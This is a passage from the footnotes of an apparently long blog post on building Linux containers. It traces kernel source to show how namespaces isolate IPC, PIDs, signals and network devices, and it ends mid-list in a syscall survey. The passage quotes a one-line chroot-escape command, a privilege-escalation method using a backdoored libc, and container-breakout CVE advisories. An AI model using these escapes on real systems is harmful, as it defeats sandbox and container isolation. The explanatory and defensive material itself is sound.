<li>In the IPC shared memory system <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>ipc/shm.c@c8d2bc</code></a> (done after
<code>shm_obtain_object</code> and <code>shm_obtain_object_check</code>):
<ul class="org-ul">
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n869"><code>ipc/shm.c:869@c8d2bc</code></a>: <code>shmctl_nolock</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1081"><code>ipc/shm.c:1081@c8d2bc</code></a>: <code>do_shmat</code></li>
</ul></li>
<li>In the IPC semaphore system, <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>ipc/sem.c@c8d2bc</code></a> (done <code>sem_obtain_object</code>
and <code>sem_obtain_object_check</code>):
<ul class="org-ul">
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1200"><code>ipc/sem.c:1200@c8d2bc</code></a>: <code>semctl_nolock</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1289"><code>ipc/sem.c:1289@c8d2bc</code></a>: <code>semctl_setval</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1360"><code>ipc/sem.c:1360@c8d2bc</code></a>: <code>semctl_main</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1816"><code>ipc/sem.c:1816@c8d2bc</code></a>: <code>semtimedop</code></li>
</ul></li>
<li>In the IPC message queue system, <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>ipc/msg.c@c8d2bc</code></a> (done after
<code>msq_obtain_object</code> and <code>msq_obtain_object_check)</code>:
<ul class="org-ul">
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n445"><code>ipc/msg.c:445@c8d2bc</code></a>: <code>msgctl_nolock</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n630"><code>ipc/msg.c:630@c8d2bc</code></a>: <code>do_msgsnd</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n846"><code>ipc/msg.c:846@c8d2bc</code></a>: <code>do_msgrcv</code></li>
</ul></li>
</ul>

<p class="footpara">
<code>ipc_check_perms</code> is another a thin layer over it that doesn't check the IPC namespace.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 89: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n290"><code>ipc/util.c:290@c8d2bc</code></a></label><pre class="src src-C">/**
 * ipc_check_perms - check security and permissions for an ipc object
 * @ns: ipc namespace
 * @ipcprgre: ipc permission set
 * @ops: the actual security routine to call
 * @params: its parameters
 *
 * This routine is called by sys_msgget(), sys_semget() and sys_shmget()
 * when the key is not IPC_PRIVATE and that key already exists in the
 * ds IDR.
 *
 * On success, the ipc id is returned.
 *
 * It is called with ipc_ids.rwsem and ipcp-&gt;lock held.
 */
static int ipc_check_perms(struct ipc_namespace *ns,
			   struct kern_ipc_perm *ipcp,
			   const struct ipc_ops *ops,
			   struct ipc_params *params)
{
	int err;

	if (ipcperms(ns, ipcp, params-&gt;flg))
		err = -EACCES;
	else {
		err = ops-&gt;associate(ipcp, params-&gt;flg);
		if (!err)
			err = ipcp-&gt;id;
	}

	return err;
}
</pre>
</div>

<p class="footpara">
which is called by <code>ipcget_public</code>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 90: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n323"><code>ipc/util.c:323@c8d2bc</code></a></label><pre class="src src-C">/**
 * ipcget_public - get an ipc object or create a new one
 * @ns: ipc namespace
 * @ids: ipc identifier set
 * @ops: the actual creation routine to call
 * @params: its parameters
 *
 * This routine is called by sys_msgget, sys_semget() and sys_shmget()
 * when the key is not IPC_PRIVATE.
 * It adds a new entry if the key is not found and does some permission
 * / security checkings if the key is found.
 *
 * On success, the ipc id is returned.
 */
static int ipcget_public(struct ipc_namespace *ns, struct ipc_ids *ids,
		const struct ipc_ops *ops, struct ipc_params *params)
{
	struct kern_ipc_perm *ipcp;
	int flg = params-&gt;flg;
	int err;

	/*
	 * Take the lock as a writer since we are potentially going to add
	 * a new entry + read locks are not "upgradable"
	 */
	down_write(&amp;ids-&gt;rwsem);
	ipcp = ipc_findkey(ids, params-&gt;key);
	if (ipcp == NULL) {
		/* key not used */
		if (!(flg &amp; IPC_CREAT))
			err = -ENOENT;
		else
			err = ops-&gt;getnew(ns, params);
	} else {
		/* ipc object has been locked by ipc_findkey() */

		if (flg &amp; IPC_CREAT &amp;&amp; flg &amp; IPC_EXCL)
			err = -EEXIST;
		else {
			err = 0;
			if (ops-&gt;more_checks)
				err = ops-&gt;more_checks(ipcp, params);
			if (!err)
				/*
				 * ipc_check_perms returns the IPC id on
				 * success
				 */
				err = ipc_check_perms(ns, ipcp, ops, params);
		}
		ipc_unlock(ipcp);
	}
	up_write(&amp;ids-&gt;rwsem);

	return err;
}

</pre>
</div>

<p class="footpara">
<code>ipcget_public</code> handles both creation and accessing for
non-<code>IPC_PRIVATE</code> requests. It <b>doesn't</b> check IPC namespace for
existing IPC objects. It's called by <code>ipc_get</code> if <code>IPC_PRIVATE</code> is not
set:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 91: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/util.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n625"><code>ipc/util.c:625@c8d2bc</code></a></label><pre class="src src-C">/**
 * ipcget - Common sys_*get() code
 * @ns: namespace
 * @ids: ipc identifier set
 * @ops: operations to be called on ipc object creation, permission checks
 *       and further checks
 * @params: the parameters needed by the previous operations.
 *
 * Common routine called by sys_msgget(), sys_semget() and sys_shmget().
 */
int ipcget(struct ipc_namespace *ns, struct ipc_ids *ids,
			const struct ipc_ops *ops, struct ipc_params *params)
{
	if (params-&gt;key == IPC_PRIVATE)
		return ipcget_new(ns, ids, ops, params);
	else
		return ipcget_public(ns, ids, ops, params);
}

</pre>
</div>

<p class="footpara">
whcih in turn is called in the following places:
</p>

<ul class="org-ul">
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n654"><code>ipc/shm.c:654@c8d2bc</code></a>: <code>shmget</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n604"><code>ipc/sem.c:604@c8d2bc</code></a>: <code>semget</code></li>
<li><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n265"><code>ipc/msg.c:265@c8d2bc</code></a>: <code>msgget</code></li>
</ul>

<p class="footpara">
But <code>shmget</code>, <code>semget</code>, and <code>msgget</code> are all part of the System V IPC
set, and in order to use them you need to call <code>shmat</code>, <code>semop</code> /
<code>semtimedop</code>, and <code>msgsend</code> / <code>msgrcv~</code>, all only work for objects in
the namespace:
</p>

<p class="footpara">
<code>shmat</code> immediately calls <code>do_shmat</code>, which is listed above;
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 92: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/shm.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1249"><code>ipc/shm.c:1249@c8d2bc</code></a></label><pre class="src src-C">SYSCALL_DEFINE3(shmat, int, shmid, char __user *, shmaddr, int, shmflg)
{
	unsigned long ret;
	long err;

	err = do_shmat(shmid, shmaddr, shmflg, &amp;ret, SHMLBA);
	if (err)
		return err;
	force_successful_syscall_return();
	return (long)ret;
}

</pre>
</div>

<p class="footpara">
<code>semop</code> calls <code>semtimedop</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 93: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n2051"><code>ipc/sem.c:20151@c8d2bc</code></a></label><pre class="src src-C">SYSCALL_DEFINE3(semop, int, semid, struct sembuf __user *, tsops,
		unsigned, nsops)
{
	return sys_semtimedop(semid, tsops, nsops, NULL);
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 94: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/sem.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#1816"><code>ipc/sem.c:1816@c8d2bc</code></a></label><pre class="src src-C">SYSCALL_DEFINE4(semtimedop, int, semid, struct sembuf __user *, tsops,
		unsigned, nsops, const struct timespec __user *, timeout)
{
	/* ... */
	ns = current-&gt;nsproxy-&gt;ipc_ns;

	/* ...
	   allocate some space for things.
	   ...
	*/

	sma = sem_obtain_object_check(ns, semid);

	/* ... */
}
</pre>
</div>

<p class="footpara">
<code>msgsnd</code> and <code>msgrcv</code> immediately call <code>do_msgsnd</code> and <code>do_msgrcv</code>,
which are also listed above:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 95: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n743"><code>ipc/msg.c:743@c8d2bc</code></a></label><pre class="src src-C">SYSCALL_DEFINE4(msgsnd, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz,
		int, msgflg)
{
	long mtype;

	if (get_user(mtype, &amp;msgp-&gt;mtype))
		return -EFAULT;
	return do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 96: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/ipc/msg.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1004"><code>ipc/msg.c:1004@c8d2bc</code></a></label><pre class="src src-C">SYSCALL_DEFINE5(msgrcv, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz,
		long, msgtyp, int, msgflg)
{
	return do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.39" class="footnum" href="#fnr.39">39</a></sup> <div class="footpara"><p class="footpara">
We can see that they're effectively namespaced:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 97: </span><code>enumerate_net_devs.c</code></label><pre class="src src-C">/* Local Variables: */
/* compile-command: "gcc -Wall -Werror -static enumerate_net_devs.c \*/
/*                   -o enumerate_net_devs" */
/* End: */
#include &lt;stdio.h&gt;
#include &lt;net/if.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/ioctl.h&gt;

int main (int argc, char **argv)
{
	int sock = socket(PF_LOCAL, SOCK_SEQPACKET, 0);
	for (size_t i = 0; i &lt; 100; i++) {
		struct ifreq req = { .ifr_ifindex = i };
		if (!ioctl(sock, SIOCGIFNAME, &amp;req))
			printf("%3lu: %s\n", i, req.ifr_name);
	}
	return 0;
}
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$sudo ./contained -m . -u 0 -c ./enumerate_net_devs
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.7npCN7...done.
=&gt; trying a user namespace...writing /proc/1750/uid_map...writing
/proc/1750/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.  1: lo
=&gt; cleaning cgroups...done.
</pre></div></div>

<div class="footdef"><sup><a id="fn.40" class="footnum" href="#fnr.40">40</a></sup> <div class="footpara"><p class="footpara">
Network device datastructures are created inside of the kernel, not in
userspace with <code>mknod</code>.
</p>

<p class="footpara">
For example, <code>ip link add dummy0 type dummy</code> does this:
</p>

<ul class="org-ul">
<li>Opens a <code>NETLINK_ROUTE</code> netlink socket.</li>
<li>Sends a <code>RTM_NEWLINK</code> message over it.</li>
<li><p>
Code in <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/rtnetlink.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>net/core/rtnetlink.c@c8d2bc</code></a> dispatches the message to
<code>rtnl_create_link</code>, which does this;
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 98: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/rtnetlink.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n2239"><code>net/core/rtnetlink.c:2239@c8d2bc</code></a></label><pre class="src src-C">struct net_device *rtnl_create_link(struct net *net,
	const char *ifname, unsigned char name_assign_type,
	const struct rtnl_link_ops *ops, struct nlattr *tb[])
{
	int err;
	struct net_device *dev;
	unsigned int num_tx_queues = 1;
	unsigned int num_rx_queues = 1;

	/* ... */

	err = -ENOMEM;
	dev = alloc_netdev_mqs(ops-&gt;priv_size, ifname, name_assign_type,
			       ops-&gt;setup, num_tx_queues, num_rx_queues);
	if (!dev)
		goto err;

	/* ... */
}
</pre>
</div></li>

<li><p>
<code>alloc_netdev_mqs</code> calls the <code>setup</code> function:
</p>

<div class="org-src-container">
<pre class="src src-C">/**
 *	alloc_netdev_mqs - allocate network device
 *	@sizeof_priv:		size of private data to allocate space for
 *	@name:			device name format string
 *	@name_assign_type:	origin of device name
 *	@setup:			callback to initialize device
 *	@txqs:			the number of TX subqueues to allocate
 *	@rxqs:			the number of RX subqueues to allocate
 *
 *	Allocates a struct net_device with private data area for driver use
 *	and performs basic initialization.  Also allocates subqueue structs
 *	for each queue on the device.
 */
struct net_device *alloc_netdev_mqs(int sizeof_priv, const char *name,
		unsigned char name_assign_type,
		void (*setup)(struct net_device *),
		unsigned int txqs, unsigned int rxqs)
{
	struct net_device *dev;
	size_t alloc_size;
	struct net_device *p;

	/* ... */

	setup(dev);

	/* ... */
}
</pre>
</div></li>

<li><p>
<code>dummy_setup</code> gets called, since it's the <code>.setup</code> of a
<code>rtnl_link_ops</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 100: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/drivers/net/dummy.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n170"><code>drivers/net/dummy.c:170@c8d2bc</code></a></label><pre class="src src-C">static struct rtnl_link_ops dummy_link_ops __read_mostly = {
	.kind		= DRV_NAME,
	.setup		= dummy_setup,
	.validate	= dummy_validate,
};

</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 101: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/drivers/net/dummy.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n137"><code>drivers/net/dummy.c:137@c8d2bc</code></a></label><pre class="src src-C">static void dummy_setup(struct net_device *dev)
{
	ether_setup(dev);

	/* Initialize the device structure. */
	dev-&gt;netdev_ops = &amp;dummy_netdev_ops;
	dev-&gt;ethtool_ops = &amp;dummy_ethtool_ops;
	dev-&gt;destructor = free_netdev;

	/* Fill in device structure with ethernet-generic values. */
	dev-&gt;flags |= IFF_NOARP;
	dev-&gt;flags &amp;= ~IFF_MULTICAST;
	dev-&gt;priv_flags |= IFF_LIVE_ADDR_CHANGE | IFF_NO_QUEUE;
	dev-&gt;features	|= NETIF_F_SG | NETIF_F_FRAGLIST;
	dev-&gt;features	|= NETIF_F_ALL_TSO | NETIF_F_UFO;
	dev-&gt;features	|= NETIF_F_HW_CSUM | NETIF_F_HIGHDMA | NETIF_F_LLTX;
	dev-&gt;features	|= NETIF_F_GSO_ENCAP_ALL;
	dev-&gt;hw_features |= dev-&gt;features;
	dev-&gt;hw_enc_features |= dev-&gt;features;
	eth_hw_addr_random(dev);
}

</pre>
</div></li>
</ul>

<p class="footpara">
In other words, there's no equivalent of userspace major / minor
device numbers for network devices.
</p></div></div>

<div class="footdef"><sup><a id="fn.41" class="footnum" href="#fnr.41">41</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 102: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/ptrace.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1079"><code>kernel/ptrace.c:1079@c8d2bc</code></a>:</label><pre class="src src-C">SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,
		unsigned long, data)
{
	struct task_struct *child;
	long ret;

	if (request == PTRACE_TRACEME) {
		ret = ptrace_traceme();
		if (!ret)
			arch_ptrace_attach(current);
		goto out;
	}

	child = ptrace_get_task_struct(pid);
	if (IS_ERR(child)) {
		ret = PTR_ERR(child);
		goto out;
	}
	[...]
}
</pre>
</div>

<p class="footpara">
which calls <code>ptrace_get_task_struct</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 103: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/ptrace.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n1060"><code>kernel/ptrace.c:1060@c8d2bc</code></a>:</label><pre class="src src-C">static struct task_struct *ptrace_get_task_struct(pid_t pid)
{
	struct task_struct *child;

	rcu_read_lock();
	child = find_task_by_vpid(pid);
	if (child)
		get_task_struct(child);
	rcu_read_unlock();

	if (!child)
		return ERR_PTR(-ESRCH);
	return child;
}

</pre>
</div>

<p class="footpara">
&#x2026;which in turn calls <code>find_task_by_vpid</code>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 104: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n459"><code>kernel/pid.c:459@c8d2bc</code></a>:</label><pre class="src src-C">struct task_struct *find_task_by_vpid(pid_t vnr)
{
	return find_task_by_pid_ns(vnr, task_active_pid_ns(current));
}

</pre>
</div>

<p class="footpara">
which calls <code>find_task_by_pid_ns</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 105: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n452"><code>kernel/pid.c:452@c8d2bc</code></a>:</label><pre class="src src-C">struct task_struct *find_task_by_pid_ns(pid_t nr, struct pid_namespace *ns)
{
	RCU_LOCKDEP_WARN(!rcu_read_lock_held(),
			 "find_task_by_pid_ns() needs rcu_read_lock() protection");
	return pid_task(find_pid_ns(nr, ns), PIDTYPE_PID);
}

</pre>
</div>

<p class="footpara">
which, finally, calls <code>find_pid_ns</code>. You can see here that it only
finds a <code>stuct pid *</code> that shares the pid namespace of the current task.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 106: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/pid.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n366"><code>kernel/pid.c:366@c8d2bc</code></a>:</label><pre class="src src-C">struct pid *find_pid_ns(int nr, struct pid_namespace *ns)
{
	struct upid *pnr;

	hlist_for_each_entry_rcu(pnr,
			&amp;pid_hash[pid_hashfn(nr, ns)], pid_chain)
		if (pnr-&gt;nr == nr &amp;&amp; pnr-&gt;ns == ns)
			return container_of(pnr, struct pid,
					numbers[ns-&gt;level]);

	return NULL;
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.42" class="footnum" href="#fnr.42">42</a></sup> <div class="footpara"><p class="footpara">
The <code>kill</code> syscalls call <code>kill_something_info</code>, which follows a dense
call chain ( <code>kill_pid_info</code> -&gt; <code>group_send_sig_info</code> -&gt;
<code>do_send_sig_info</code> -&gt; <code>send_sig_info</code> -&gt; <code>send_signal</code> -&gt;
<code>__send_signal</code>) to eventually end up in <code>__send_signal</code>, which does
respect user namespaces:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 107: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/signal.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n972"><code>kernel/signal.c:972@c8d2bc</code></a></label><pre class="src src-C">static int __send_signal(int sig, struct siginfo *info, struct task_struct *t,
			int group, int from_ancestor_ns)
{
	/* ... */
	q = __sigqueue_alloc(sig, t, GFP_ATOMIC | __GFP_NOTRACK_FALSE_POSITIVE,
		override_rlimit);
	if (q) {
		list_add_tail(&amp;q-&gt;list, &amp;pending-&gt;list);
		switch ((unsigned long) info) {
		case (unsigned long) SEND_SIG_NOINFO:
			q-&gt;info.si_signo = sig;
			q-&gt;info.si_errno = 0;
			q-&gt;info.si_code = SI_USER;
			q-&gt;info.si_pid = task_tgid_nr_ns(current,
							task_active_pid_ns(t));
			q-&gt;info.si_uid = from_kuid_munged(current_user_ns(), current_uid());
			break;
		case (unsigned long) SEND_SIG_PRIV:
			q-&gt;info.si_signo = sig;
			q-&gt;info.si_errno = 0;
			q-&gt;info.si_code = SI_KERNEL;
			q-&gt;info.si_pid = 0;
			q-&gt;info.si_uid = 0;
			break;
		default:
			copy_siginfo(&amp;q-&gt;info, info);
			if (from_ancestor_ns)
				q-&gt;info.si_pid = 0;
			break;
		}

		userns_fixup_signal_uid(&amp;q-&gt;info, t);
	}
	/*...*/
}

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.43" class="footnum" href="#fnr.43">43</a></sup> <div class="footpara"><p class="footpara">
Quoted <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a>, again:
</p>

<div class="org-src-container">
<pre class="src src-text">	CAP_SETGID
		Make  arbitrary  manipulations   of  process  GIDs  and
		supplementary GID  list; forge GID when  passing socket
		credentials via  UNIX domain sockets; write  a group ID
		mapping in a user namespace (see user_namespaces(7)).
	CAP_SETUID
		Make   arbitrary   manipulations    of   process   UIDs
		(setuid(2),  setreuid(2),  setresuid(2),  setfsuid(2));
		forge  UID when  passing  socket  credentials via  UNIX
		domain  sockets; write  a  user ID  mapping  in a  user
		namespace (see user_namespaces(7)).
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.44" class="footnum" href="#fnr.44">44</a></sup> <div class="footpara"><p class="footpara">
<a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">Brad Spengler's "False Boundaries and Arbitrary Code Execution"</a>, again
</p>
<blockquote>
<p>
CAP_SYS_CHROOT: generic: From Julien Tinnes/Chris Evans: if you
have write access to the same filesystem as a suid root binary,
set up a chroot environment with a backdoored libc and then
execute a hardlinked suid root binary within your chroot and gain
full root privileges through your backdoor
</p>
</blockquote></div></div>

<div class="footdef"><sup><a id="fn.45" class="footnum" href="#fnr.45">45</a></sup> <div class="footpara"><p class="footpara">
<a href="http://man7.org/linux/man-pages/man2/chroot.2.html"><code>man 2 chroot</code></a>:
</p>

<blockquote>
<p>
This call does not change the current working directory, so that
after the call '.' can be outside the tree rooted at '/'.  In
particular, the superuser can escape from a "chroot jail" by doing:
</p>
<pre class="example">
mkdir foo; chroot foo; cd ..

</pre>
</blockquote></div></div>

<div class="footdef"><sup><a id="fn.46" class="footnum" href="#fnr.46">46</a></sup> <div class="footpara"><p class="footpara">
There have been issues with unpacking containers in Docker and LXC:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 110: </span><a href="http://www.openwall.com/lists/oss-security/2014/11/24/5"><code>Docker 1.3.2 - Security Advisory {24 Nov 2014}</code></a></label><pre class="src src-text">=====================================================
[CVE-2014-6407] Archive extraction allowing host privilege escalation
=====================================================
Severity: Critical
Affects: Docker up to 1.3.1

The Docker engine, up to and including version 1.3.1, was vulnerable to
extracting files to arbitrary paths on the host during â€˜docker pullâ€™ and
â€˜docker loadâ€™ operations. This was caused by symlink and hardlink
traversals present in Docker's image extraction. This vulnerability could
be leveraged to perform remote code execution and privilege escalation.
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 111: </span><a href="http://www.openwall.com/lists/oss-security/2015/05/07/10"><code>Docker 1.6.1 - Security Advisory {150507}</code></a></label><pre class="src src-text">====================================================================

[CVE-2015-3629] Symlink traversal on container respawn allows local
privilege escalation

====================================================================

Libcontainer version 1.6.0 introduced changes which facilitated a mount
namespace breakout upon respawn of a container. This allowed malicious
images to write files to the host system and escape containerization.
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 112: </span><a href="http://www.openwall.com/lists/oss-security/2015/07/22/4"><code>Security issues in LXC (CVE-2015-1331 and CVE-2015-1334)</code></a>, from Tyler Hicks</label><pre class="src src-text">* Roman Fiedler discovered a directory traversal flaw that allows
  arbitrary file creation as the root user. A local attacker must set up
  a symlink at /run/lock/lxc/var/lib/lxc/&lt;CONTAINER&gt;, prior to an admin
  ever creating an LXC container on the system. If an admin then creates
  a container with a name matching &lt;CONTAINER&gt;, the symlink will be
  followed and LXC will create an empty file at the symlink's target as
  the root user.
  - CVE-2015-1331
  - Affects LXC 1.0.0 and higher
  - https://launchpad.net/bugs/1470842
  - https://github.com/lxc/lxc/commit/72cf81f6a3404e35028567db2c99a90406e9c6e6 (master)
  - https://github.com/lxc/lxc/commit/61ecf69d7834921cc078e14d1b36c459ad8f91c7 (stable-1.1)
  - https://github.com/lxc/lxc/commit/f547349ea7ef3a6eae6965a95cb5986cd921bd99 (stable-1.0)

* Roman Fiedler discovered a flaw that allows processes intended to be
  run inside of confined LXC containers to escape their AppArmor or
  SELinux confinement. A malicious container can create a fake proc
  filesystem, possibly by mounting tmpfs on top of the container's
  /proc, and wait for a lxc-attach to be ran from the host environment.
  lxc-attach incorrectly trusts the container's
  /proc/PID/attr/{current,exec} files to set up the AppArmor profile and
  SELinux domain transitions which may result in no confinement being
  used.
  - CVE-2015-1334
  - Affects LXC 0.9.0 and higher
  - https://launchpad.net/bugs/1475050
  - https://github.com/lxc/lxc/commit/5c3fcae78b63ac9dd56e36075903921bd9461f9e (master)
  - https://github.com/lxc/lxc/commit/659e807c8dd1525a5c94bdecc47599079fad8407 (stable-1.1)
  - https://github.com/lxc/lxc/commit/15ec0fd9d490dd5c8a153401360233c6ee947c24 (stable-1.0)

Tyler
</pre>
</div>

<p class="footpara">
These are all really interesting! I want to write more about them.
</p></div></div>

<div class="footdef"><sup><a id="fn.47" class="footnum" href="#fnr.47">47</a></sup> <div class="footpara"><p class="footpara">
The Docker seccomp policy doesn't include an explicit blacklist, which makes
it a little hard to follow, so I wrote code to find it.
</p>

<div class="org-src-container">
<pre class="src src-python">    #!/usr/bin/env python3

    import gzip
    import requests
    import re
    import sys

    url = "https://raw.githubusercontent.com/docker/docker/5ff21add06ce0e502b41a194077daad311901996/profiles/seccomp/default.json"

    conditional = set()
    allowed = set()
    disallowed = set()

    for entry in requests.get(url).json()["syscalls"]:
        if entry["args"]:
           conditional |= set(entry["names"])
        else:
            allowed |= set(entry["names"])

    manpage = "/usr/share/man/man2/syscalls.2.gz"

    with gzip.open(manpage, "r") as f:
        ready = False
        for _line in f:
            line = _line.decode("utf-8")
            # table end
            if ready and line == ".TE\n":
                break
            match = re.match(r"\\fB(.+?)\\fP(.+)", line)
            if match:
                if match.group(1) == "System call":
                    ready = True
                elif (match.group(1) not in allowed
                      and match.group(1) not in conditional):
                    disallowed.add(match.group(1))

    print("Conditionally allowed:")
    for c in sorted(conditional):
        sys.stdout.write("~%s~, " % c)
    print("\n\nDisallowed:")
    for d in sorted(disallowed):
        sys.stdout.write("~%s~, " % d)
    sys.stdout.write("\n")
</pre>
</div>

<p>
Conditionally allowed:
<code>clone</code>, <code>personality</code>, 
</p>

<p>
Disallowed: <code>_sysctl</code>, <code>add_key</code>, <code>alloc_hugepages</code>, <code>bdflush</code>,
